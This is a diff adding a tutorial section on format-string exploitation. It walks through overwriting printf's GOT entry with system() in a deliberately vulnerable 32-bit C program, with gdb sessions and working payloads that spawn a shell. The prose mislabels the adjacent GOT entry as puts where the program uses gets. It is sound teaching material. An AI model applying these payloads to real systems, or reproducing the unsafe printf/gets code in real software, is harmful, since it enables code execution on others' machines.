@@ -1088,4 +1088,132 @@ Format string variants of exploitation:
 I will show here, how to overwrite a GOT entry.
 
 Consider the program:
+```C
+#include <stdio.h>
+#include <string.h>
+
+// gcc got-overwrite.c -o got-overwrite -fno-stack-protector -no-pie -z execstack -Wl,-z,norelro -m32
+
+
+int main(int argc, char *argv[]){
+  char buff[200];
+  strncpy(buff, argv[1], 200);
+  printf(buff);
+  char buff2[200];
+  gets(buff2);
+  printf(buff2);
+  return 0;
+}
 ```
+
+You can see GOT table:
+```bash
+$ objdump -R got-overwrite
+
+got-overwrite:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804b268 R_386_GLOB_DAT    __gmon_start__
+0804b278 R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804b27c R_386_JUMP_SLOT   gets@GLIBC_2.0
+0804b280 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0804b284 R_386_JUMP_SLOT   strncpy@GLIBC_2.0
+```
+
+Let's try to overwrite it in gdb. For this, you need to do the same as above in the exploitation of vulnerability:
+
+1. Determine the function that is similar to system() or execve() and in which program puts the arguments that you can control.
+2. Determine the address of the system or execve.
+3. Specify the address within GOT table.
+4. Overwrite it with the address of the system or execve.
+
+### Determine the function as a target
+
+In my program `got-overwrite.c`, you can find the place where it takes another output interactively in another buffer `buff2`. So, the printf is a nice candidate for overwriting within GOT table. But here the problem - the address of printf within GOT is placed above the address of puts. So, if you will overwrite printf, you also overwrite the next 2 bytes of puts address and it will not allow you to exploit the program. Thus, you also need to overwrite the puts address with it.
+
+### Determine the address of system or execve
+
+In gdb:
+```bash
+gef➤  print system
+$1 = {<text variable, no debug info>} 0xf7e02830 <system>
+```
+
+So, this is the address which you will write in GOT.
+
+### Specify the address within GOT table
+
+Let's try to exploit it without overwriting puts. I'll not specify how to determine the address and direct parameter number, you can do it yourself.
+```bash
+gef➤  b *main + 138
+Breakpoint 1 at 0x8049260
+gef➤  r aaaa
+Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/got-overwrite aaaa
+aaaaaaaa
+
+Breakpoint 1, 0x08049260 in main ()
+gef➤  got
+
+GOT protection: No RelRO | GOT functions: 4
+
+[0x804b278] printf@GLIBC_2.0  →  0xf7e11340
+[0x804b27c] gets@GLIBC_2.0  →  0xf7e2e1b0
+[0x804b280] __libc_start_main@GLIBC_2.0  →  0xf7ddbdf0
+[0x804b284] strncpy@GLIBC_2.0  →  0xf7e58690
+gef➤  r $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "%10280u" + "%54$n" + "%53168u" + "%55$n"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/got-overwrite $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "%10280u" + "%54$n" + "%53168u" + "%55$n"')
+xz
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08040000 in ?? ()
+gef➤  got
+
+GOT protection: No RelRO | GOT functions: 4
+
+[0x804b278] printf@GLIBC_2.0  →  0xf7e02830
+[0x804b27c] gets@GLIBC_2.0  →  0x8040000
+[0x804b280] __libc_start_main@GLIBC_2.0  →  0xf7ddbdf0
+[0x804b284] strncpy@GLIBC_2.0  →  0xf7e58690
+gef➤
+```
+Here, you see that the printf now has another address, but `puts` has too. That's why you need the next overwrite.
+
+### Overwrite it with the address of the system
+
+Now, after the first write in GOT, do next write. I can't show you all output, because the format string just places the large empty space between the command and result:
+```bash
+gef➤  r $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "\x7c\xb2\x04\x08" + "\x7e\xb2\x04\x08" + "%10272u" + "%54$n" + "%53168u" + "%55$n" + "%59856u" + "%56$n" + "%5682u" + "%57$n"')
+
+================
+space here
+================
+
+0/bin/sh
+[Detaching after vfork from child process 7246]
+$ w
+16:08:13 up 42 min,  1 user,  load average: 0.16, 0.50, 0.50
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+shogun   tty7     :0               15:25   42:37   1:15   1.33s xfce4-session
+$
+```
+
+Try it outside gdb:
+```bash
+shogun@kyoto:~/repos/basics-of-pwn/content/format-string$ ./got-overwrite $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "\x7c\xb2\x04\x08" + "\x7e\xb2\x04\x08" + "%10272u" + "%54$n" + "%53168u" + "%55$n" + "%59856u" + "%56$n" + "%5682u" + "%57$n"')
+xz|~                                                                                                                                                                                                                   =====
+space
+=====                                                                                                                                                                     4294955702                                                                                                                                                                                                             =====
+space
+=====                                                                           200                                                                                                                                                                                                                    =====
+space
+=====
+134517236                                                                                                                                                                                                              
+=====
+space
+=====
+0/bin/sh
+$
+```
+
+Thus, after the puts placed input string in buff2, you call the system function and it executes the command which you input in buff2.
